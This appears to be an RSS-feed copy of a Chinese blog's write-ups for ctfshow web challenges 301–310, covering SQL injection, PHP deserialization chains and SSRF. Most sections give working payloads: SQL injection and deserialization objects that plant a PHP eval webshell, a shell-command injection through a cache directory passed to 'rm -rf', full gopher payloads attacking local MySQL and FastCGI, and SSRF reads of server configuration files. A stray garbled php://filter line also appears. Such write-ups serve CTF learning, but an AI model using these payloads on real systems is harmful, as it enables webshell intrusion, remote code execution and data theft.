&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;python sqlmap.py -u http://392cb8ff-78e8-4004-9117-6a9a0d378c35.challenge.ctf.show/checklogin.php --form --batch --dump
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所花时间比较长，需要等待&lt;/p&gt;
&lt;p&gt;最后得到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/ctfshow/Web-vip/web301_sqlmap.jpg&#34; alt=&#34;sqlmap结构结果&#34; title=&#34;运行结果&#34;&gt;&lt;/p&gt;
&lt;p&gt;username：&lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;password： &lt;code&gt;ctfshowwwww&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;登录成功后跳转到&lt;code&gt;index.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以看到flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/ctfshow/Web-vip/web301_sqlmap_result.jpg&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;写一句话&#34;&gt;&lt;a href=&#34;#写一句话&#34; class=&#34;headerlink&#34; title=&#34;写一句话&#34;&gt;&lt;/a&gt;写一句话&lt;/h2&gt;&lt;p&gt;根据原SQL语句的结构，注入位置为&lt;code&gt;where&lt;/code&gt;后，首先需要闭合单引号&lt;code&gt;&#39;&lt;/code&gt;，再由此进行联合查询写文件,最后再过滤即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;&#39; union select &#34;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#34; into outfile &#34;/var/www/html/1.php&#34;#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;于是在登陆界面&lt;/p&gt;
&lt;p&gt;username: &lt;code&gt;&#39; union select &#34;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#34; into outfile &#34;/var/www/html/1.php&#34;#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;password: &lt;code&gt;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;点击登录后，可以发现停在&lt;code&gt;checklogin.php&lt;/code&gt;，可知sql语句执行成功&lt;/p&gt;
&lt;p&gt;访问&lt;code&gt;1.php&lt;/code&gt;，报错&lt;code&gt;Notice: Undefined offset: 1 in /var/www/html/1.php on line 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1=system(&#39;ls&#39;)&lt;/code&gt;可以看到flag.php&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1=system(&#39;tac flag.php&#39;);&lt;/code&gt;得到flag&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ctfshow{be6425ec-a5f6-4afb-b76f-104b34576198}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-302&#34;&gt;&lt;a href=&#34;#web-302&#34; class=&#34;headerlink&#34; title=&#34;web 302&#34;&gt;&lt;/a&gt;web 302&lt;/h1&gt;&lt;p&gt;题目提示&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;if(!strcasecmp(sds_decode($userpwd),$row[&#39;sds_password&#39;])){
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但sql语句在之前已经执行，因此同样可以采用上面的两种方法&lt;/p&gt;
&lt;h1 id=&#34;web-303&#34;&gt;&lt;a href=&#34;#web-303&#34; class=&#34;headerlink&#34; title=&#34;web 303&#34;&gt;&lt;/a&gt;web 303&lt;/h1&gt;&lt;p&gt;根据题目所给的源码，在&lt;code&gt;dptadd.php&lt;/code&gt;中找到注入点&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$sql=&#34;insert into sds_dpt set sds_name=&#39;&#34;.$dpt_name.&#34;&#39;,sds_address =&#39;&#34;.$dpt_address.&#34;&#39;,sds_build_date=&#39;&#34;.$dpt_build_year.&#34;&#39;,sds_have_safe_card=&#39;&#34;.$dpt_has_cert.&#34;&#39;,sds_safe_card_num=&#39;&#34;.$dpt_cert_number.&#34;&#39;,sds_telephone=&#39;&#34;.$dpt_telephone_number.&#34;&#39;;&#34;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而在这一sql语句中，没有任何的过滤&lt;/p&gt;
&lt;p&gt;而要进入这一段代码的执行，可以看到，&lt;code&gt;if(!isset($_SESSION[&#39;login&#39;]))&lt;/code&gt;，即需要先登录成功&lt;/p&gt;
&lt;p&gt;再次查看源码，在&lt;code&gt;sds_user.sql&lt;/code&gt;文件中，有这样一条信息&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;INSERT INTO `sds_user` VALUES (&#39;1&#39;, &#39;admin&#39;, &#39;27151b7b1ad51a38ea66b1529cde5ee4&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也就是说，我们知道了一个账户的账号和密码，因此可以借此登录。但很明显，密码为密文形式，需要解出明文&lt;/p&gt;
&lt;p&gt;xxxxxxxxxx&amp;nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;if(!strcasecmp(sds_decode($userpwd),$row[&#39;sds_password&#39;])){
    $_SESSION[&#39;login&#39;]=1;
    $result-&amp;gt;free();
    $mysqli-&amp;gt;close();
    header(&#34;location:index.php&#34;);
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也就是说，只有&lt;code&gt;sds_decode($userpwd)&lt;/code&gt;与&lt;code&gt;$row[&#39;sds_password&#39;]&lt;/code&gt;相等才可以登陆成功，已知&lt;code&gt;$row[&#39;sds_password&#39;]&lt;/code&gt;为&lt;code&gt;27151b7b1ad51a38ea66b1529cde5ee4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查看&lt;code&gt;sds_decode&lt;/code&gt;方法的定义，在&lt;code&gt;fun.php&lt;/code&gt;中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
function sds_decode($str){
    return md5(md5($str.md5(base64_encode(&#34;sds&#34;))).&#34;sds&#34;);
}
echo sds_decode(&#34;admin&#34;);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尝试用该方法的逆向过程解密，但发现&lt;code&gt;27151b7b1ad51a38ea66b1529cde5ee4&lt;/code&gt;解不了&lt;/p&gt;
&lt;p&gt;看到&lt;code&gt;echo sds_decode(&#34;admin&#34;);&lt;/code&gt;，尝试运行，会发现输出的内容恰好为&lt;code&gt;27151b7b1ad51a38ea66b1529cde5ee4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;于是得知一个账户的账号和密码，均为&lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当执行成功后，会跳转到&lt;code&gt;dpt.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;dpt.php&lt;/code&gt;中有&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
//注入点
$_GET[&#39;id&#39;]=!empty($_GET[&#39;id&#39;])?$_GET[&#39;id&#39;]:NULL;
$page=$_GET[&#39;id&#39;];
                        
                                
$sql=&#34;select * from sds_dpt order by id;&#34;;
$result=$mysqli-&amp;gt;query($sql);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也即可以利用这一页面来查看添加的值，于是查表payload&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dpt_name=1&#39;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/ctfshow/Web-vip/web_303_1.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sds_dpt,sds_fl9g,sds_user&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;猜测在表&lt;code&gt;sds_fl9g&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查列payload:&lt;code&gt;dpt_name=1&#39;,sds_address=(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;sds_fl9g&#39;)%23&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/ctfshow/Web-vip/web_303_2.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查值payload：&lt;code&gt;dpt_name=1&#39;,sds_address=(select group_concat(flag) from sds.sds_fl9g)%23&lt;/code&gt;(数据库名&lt;code&gt;sds&lt;/code&gt;可以从源码中的&lt;code&gt;conn.php&lt;/code&gt;找到，也可以查)&lt;/p&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/ctfshow/Web-vip/web_303_3.jpg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-304&#34;&gt;&lt;a href=&#34;#web-304&#34; class=&#34;headerlink&#34; title=&#34;web 304&#34;&gt;&lt;/a&gt;web 304&lt;/h1&gt;&lt;p&gt;说添加了waf，但实际没有，同上面方法，除表名改为&lt;code&gt;sds_flaag&lt;/code&gt;，其他不变&lt;/p&gt;
&lt;h1 id=&#34;web-305&#34;&gt;&lt;a href=&#34;#web-305&#34; class=&#34;headerlink&#34; title=&#34;web 305&#34;&gt;&lt;/a&gt;web 305&lt;/h1&gt;&lt;p&gt;此题增加了waf，不能像上两题一样解题，但很明显多了个&lt;code&gt;class.php&lt;/code&gt;文件，查看&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-17 13:20:37
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-17 13:33:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


class user{
    public $username;
    public $password;
    public function __construct($u,$p){
        $this-&amp;gt;username=$u;
        $this-&amp;gt;password=$p;
    }
    public function __destruct(){
        file_put_contents($this-&amp;gt;username, $this-&amp;gt;password);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;public function __destruct(){
    file_put_contents($this-&amp;gt;username, $this-&amp;gt;password);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看起来是反序列化&lt;/p&gt;
&lt;p&gt;再看&lt;code&gt;checklogin.php&lt;/code&gt;，看到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$user_cookie = $_COOKIE[&#39;user&#39;];
if(isset($user_cookie)){
    $user = unserialize($user_cookie);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;没有任何限制，也就是只要创建一个反序列化对象即可，然后通过&lt;code&gt;$COOKIE[&#39;user&#39;]&lt;/code&gt;传递，最后点击登录，便能执行反序列化&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class user{
    public $username;
    public $password;
    public function __construct($u,$p){
        $this-&amp;gt;username=$u;
        $this-&amp;gt;password=$p;
    }
    public function __destruct(){
        file_put_contents($this-&amp;gt;username, $this-&amp;gt;password);
    }
}

$a = new user(&#39;1.php&#39;,&#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#39;);
echo urlencode(serialize($a));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;按以上操作后，访问&lt;code&gt;1.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以看到报错，使用蚁剑连接数据库&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/ctfshow/Web-vip/web_305.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;数据库类型为&lt;code&gt;MYSQLI&lt;/code&gt;，密码为&lt;code&gt;root&lt;/code&gt;(该密码可在蚁剑文件界面的&lt;code&gt;conn.php&lt;/code&gt;找到，与下载来的源码文件不同)&lt;/p&gt;
&lt;p&gt;通过查表，得到flag在&lt;code&gt;sds.sds_flabag&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-306&#34;&gt;&lt;a href=&#34;#web-306&#34; class=&#34;headerlink&#34; title=&#34;web 306&#34;&gt;&lt;/a&gt;web 306&lt;/h1&gt;&lt;p&gt;查看代码，发现&lt;code&gt;index.php&lt;/code&gt;有反序列化操作&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$user = unserialize(base64_decode($_COOKIE[&#39;user&#39;]));
if(!$user){
    header(&#34;location:login.php&#34;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;于是查找其他文件，寻找&lt;code&gt;__wakeup()``__destruct&lt;/code&gt;方法或者可以写文件之类的函数，如&lt;code&gt;file_put_contents&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后可在&lt;code&gt;class.php&lt;/code&gt;中找到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;class log{
    public $title=&#39;log.txt&#39;;
    public $info=&#39;&#39;;
    public function loginfo($info){
        $this-&amp;gt;info=$this-&amp;gt;info.$info;
    }
    public function close(){
        file_put_contents($this-&amp;gt;title, $this-&amp;gt;info);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只要构造一个log类对象，然后调用&lt;code&gt;close()&lt;/code&gt;方法，便能写文件&lt;/p&gt;
&lt;p&gt;查找所有文件的类中是否有调用&lt;code&gt;close()&lt;/code&gt;的方法&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;dao.php&lt;/code&gt;中找到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;class dao{
    private $config;
    private $conn;

    public function __construct(){
        $this-&amp;gt;config=new config();
        $this-&amp;gt;init();
    }
    private function init(){
        $this-&amp;gt;conn=new mysqli($this-&amp;gt;config-&amp;gt;get_mysql_host(),$this-&amp;gt;config-&amp;gt;get_mysql_username(),$this-&amp;gt;config-&amp;gt;get_mysql_password(),$this-&amp;gt;config-&amp;gt;get_mysql_db());
    }
    public function __destruct(){
        $this-&amp;gt;conn-&amp;gt;close();
    }

    public function get_user_password_by_username($u){
        $sql=&#34;select sds_password from sds_user where sds_username=&#39;&#34;.$u.&#34;&#39; order by id limit 1;&#34;;
        $result=$this-&amp;gt;conn-&amp;gt;query($sql);
        $row=$result-&amp;gt;fetch_array(MYSQLI_BOTH);
        if($result-&amp;gt;num_rows&amp;gt;0){
            return $row[&#39;sds_password&#39;];
        }else{
            return &#39;&#39;;
        }
    }

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当其&lt;code&gt;__destruct&lt;/code&gt;时即可执行，但由于以其本身创建的&lt;code&gt;$this-&amp;gt;conn&lt;/code&gt;为&lt;code&gt;mysqli&lt;/code&gt;对象，故需要想方法使其为&lt;code&gt;log&lt;/code&gt;对象&lt;/p&gt;
&lt;p&gt;好在该文件&lt;code&gt;require &#34;class.php&#34;&lt;/code&gt;，故可以构造时就使其为&lt;code&gt;log&lt;/code&gt;对象&lt;/p&gt;
&lt;p&gt;而在&lt;code&gt;index.php&lt;/code&gt;，又也&lt;code&gt;require &#34;dao.php&#34;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;故代码为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class dao{
    private $config;
    private $conn;
    public function __construct($u){
        $this-&amp;gt;conn=$u;
    }
}

class log{
    public $title=&#39;1.php&#39;;
    public $info=&#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#39;;
}

$a = new dao(new log());
echo urlencode(base64_encode(serialize($a)));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;payload为&lt;code&gt;TzozOiJkYW8iOjI6e3M6MTE6IgBkYW8AY29uZmlnIjtOO3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;填写cookie后，访问&lt;code&gt;index.php&lt;/code&gt;，再访问&lt;code&gt;1.php&lt;/code&gt;，得到报错&lt;strong&gt;Notice&lt;/strong&gt;: Undefined offset: 1 in &lt;strong&gt;/var/www/html/1.php&lt;/strong&gt; on line &lt;strong&gt;1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1=system(&#39;ls&#39;);&lt;/code&gt;后发现有&lt;code&gt;flag.php&lt;/code&gt;，&lt;code&gt;1=system(&#39;tac flag.php&#39;);&lt;/code&gt;，得到flag&lt;/p&gt;
&lt;h1 id=&#34;web-307&#34;&gt;&lt;a href=&#34;#web-307&#34; class=&#34;headerlink&#34; title=&#34;web 307&#34;&gt;&lt;/a&gt;web 307&lt;/h1&gt;&lt;p&gt;查询反序列化路口，可以找到四个，其中三个只有反序列化，一个为反序列化后，并调用了其&lt;code&gt;clearCache()&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;查看所有的类，之前能用的&lt;code&gt;__destruct&lt;/code&gt;中&lt;code&gt;close()&lt;/code&gt;，由于&lt;code&gt;log&lt;/code&gt;类的对应写文件方法为&lt;code&gt;closelog()&lt;/code&gt;，故该方法失效，所以只能选用&lt;code&gt;logout.php&lt;/code&gt;中的反序列化，调用&lt;code&gt;clearCache()&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;查看所有拥有&lt;code&gt;clearCache()&lt;/code&gt;方法的类，为&lt;code&gt;dao&lt;/code&gt;和&lt;code&gt;service&lt;/code&gt;，而&lt;code&gt;service&lt;/code&gt;最终调用的也为&lt;code&gt;dao&lt;/code&gt;类中的&lt;code&gt;clearCache()&lt;/code&gt;方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;public function  clearCache(){
    shell_exec(&#39;rm -rf ./&#39;.$this-&amp;gt;config-&amp;gt;cache_dir.&#39;/*&#39;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;故只需巧妙构造一个&lt;code&gt;$this-&amp;gt;config-&amp;gt;cache_dir&lt;/code&gt;便可执行系统命令&lt;/p&gt;
&lt;p&gt;而对于&lt;code&gt;config&lt;/code&gt;类&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;class config{
    private $mysql_username=&#39;root&#39;;
    private $mysql_password=&#39;phpcj&#39;;
    private $mysql_db=&#39;sds&#39;;
    private $mysql_port=3306;
    private $mysql_host=&#39;localhost&#39;;
    public $cache_dir = &#39;cache&#39;;

    public function get_mysql_username(){
        return $this-&amp;gt;mysql_username;
    }
    public function get_mysql_password(){
        return $this-&amp;gt;mysql_password;
    }
    public function get_mysql_port(){
        return $this-&amp;gt;mysql_port;
    }
    public function get_mysql_db(){
        return $this-&amp;gt;mysql_db;
    }
    public function get_mysql_host(){
        return $this-&amp;gt;mysql_host;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只需修改&lt;code&gt;public $cache_dir = &#39;cache&#39;;&lt;/code&gt;项&lt;/p&gt;
&lt;p&gt;故现在有两个选项，序列化&lt;code&gt;dao&lt;/code&gt;和序列化&lt;code&gt;service&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但由于&lt;code&gt;service&lt;/code&gt;类存在&lt;code&gt;__wakeup()&lt;/code&gt;方法，再进行反序列化操作前，会调用此方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;public function __wakeup(){
    $this-&amp;gt;config=new config();
    $this-&amp;gt;dao=new dao();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也即此时的&lt;code&gt;config&lt;/code&gt;和&lt;code&gt;dao&lt;/code&gt;都会刷新，那么&lt;code&gt;dao&lt;/code&gt;中的构造好的&lt;code&gt;config&lt;/code&gt;也会刷新，从而丢失构造好的数据，故只能选用&lt;code&gt;dao&lt;/code&gt;序列化&lt;/p&gt;
&lt;p&gt;代码如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class config{
    private $mysql_username=&#39;root&#39;;
    private $mysql_password=&#39;phpcj&#39;;
    private $mysql_db=&#39;sds&#39;;
    private $mysql_port=3306;
    private $mysql_host=&#39;localhost&#39;;
    public $cache_dir = &#39;x;echo &#34;&amp;lt;?php eval(\$_POST[1]);?&amp;gt;&#34; &amp;gt; &#34;/var/www/html/1.php&#34;;echo &#39;;
}
class dao{
    private $config;
    private $conn;
    public function __construct($u){
        $this-&amp;gt;config=$u;
    }
}

$a = new dao(new config());
echo urlencode(base64_encode(serialize($a)));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;访问&lt;code&gt;controller/logout.php&lt;/code&gt;，自动跳转到&lt;code&gt;login.php&lt;/code&gt;后，访问&lt;code&gt;1.php&lt;/code&gt;，之后分别输入&lt;code&gt;1=system(&#39;ls&#39;)&lt;/code&gt;和&lt;code&gt;1=system(&#39;tac flag.php&#39;)&lt;/code&gt;得到flag&lt;/p&gt;
&lt;h1 id=&#34;web-308&#34;&gt;&lt;a href=&#34;#web-308&#34; class=&#34;headerlink&#34; title=&#34;web 308&#34;&gt;&lt;/a&gt;web 308&lt;/h1&gt;&lt;p&gt;相较于上题，&lt;code&gt;clearCache()&lt;/code&gt;方法添加了正则匹配&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;public function  clearCache(){
    if(preg_match(&#39;/^[a-z]+$/i&#39;, $this-&amp;gt;config-&amp;gt;cache_dir)){
        shell_exec(&#39;rm -rf ./&#39;.$this-&amp;gt;config-&amp;gt;cache_dir.&#39;/*&#39;);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入的目录只允许存在字母，这里便不利于使用，放弃该利用点&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;fun.php&lt;/code&gt;中存在ssrf&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;function checkUpdate($url){
        $ch=curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而这函数在&lt;code&gt;dao&lt;/code&gt;类的&lt;code&gt;checkVersion&lt;/code&gt;方法中出现&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;public function checkVersion(){
    return checkUpdate($this-&amp;gt;config-&amp;gt;update_url);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而&lt;code&gt;checkVersion&lt;/code&gt;在&lt;code&gt;index.php&lt;/code&gt;中被调用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$service = unserialize(base64_decode($_COOKIE[&#39;service&#39;]));
if($service){
    $lastVersion=$service-&amp;gt;checkVersion();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;poc&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class config{
    public $update_url = &#39;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01&#39;;
}
class dao{
    private $config;
    public function __construct(){
        $this-&amp;gt;config=new config();
    }

}
$a=new dao();
echo urlencode(base64_encode(serialize($a)));
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中&lt;code&gt;$update_url&lt;/code&gt;由gopherus生成&lt;/p&gt;
&lt;p&gt;由于从代码可知为mysql，故生成命令&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;python2 gopherus.py --exploit mysql
root
select &#34;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#34; into outfile &#34;/var/www/html/1.php&#34;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/ctfshow/Web-vip/web308.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后访问&lt;code&gt;1.php&lt;/code&gt;，拿到shell，获取flag&lt;/p&gt;
&lt;h1 id=&#34;web-309&#34;&gt;&lt;a href=&#34;#web-309&#34; class=&#34;headerlink&#34; title=&#34;web 309&#34;&gt;&lt;/a&gt;web 309&lt;/h1&gt;&lt;p&gt;打的不是mysql了，打的是fastcgi.探测是通过gopher协议的延迟判断的&lt;/p&gt;
&lt;p&gt;gopher://127.0.0.1:9000&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;python2 gopherus.py --exploit fastcgi
index.php
echo &#34;&amp;lt;?php eval(\$_POST[1]);?&amp;gt;&#34; &amp;gt; &#34;/var/www/html/1.php&#34;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/ctfshow/Web-vip/web309.jpg&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class config{
    public $update_url = &#39;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F7%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH108%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00l%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%20%22/var/www/html/1.php%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#39;;
}
class dao{
    private $config;
    public function __construct(){
        $this-&amp;gt;config=new config();
    }

}
$a=new dao();
echo urlencode(base64_encode(serialize($a)));
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;F12添加cookie，访问&lt;code&gt;index.php&lt;/code&gt;，再访问&lt;code&gt;1.php&lt;/code&gt;，得到shell，之后获取flag&lt;/p&gt;
&lt;h1 id=&#34;web-310&#34;&gt;&lt;a href=&#34;#web-310&#34; class=&#34;headerlink&#34; title=&#34;web 310&#34;&gt;&lt;/a&gt;web 310&lt;/h1&gt;&lt;p&gt;9000和6379都是关着的。那我们可以试试读下配置文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class config{
    public $update_url = &#39;file:///etc/nginx/nginx.conf&#39;;
}
class dao{
    private $config;
    public function __construct(){
        $this-&amp;gt;config=new config();
    }

}
$a=new dao();
echo urlencode(base64_encode(serialize($a)));
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到关键信息(抓包获取)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;    server {
        listen       4476;
        server_name  localhost;
        root         /var/flag;
        index index.html;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;poc&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class config{
    public $update_url = &#39;http://127.0.0.1:4476&#39;;
}
class dao{
    private $config;
    public function __construct(){
        $this-&amp;gt;config=new config();
    }
}
$a=new dao();
echo urlcode(base64_encode(serialize($a)));
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到flag&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/d3333ead/</guid>
            <title>反序列化</title>
            <link>http://dpm12345.cn/posts/d3333ead/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Tue, 04 Oct 2022 22:16:40 +0800</pubDate>
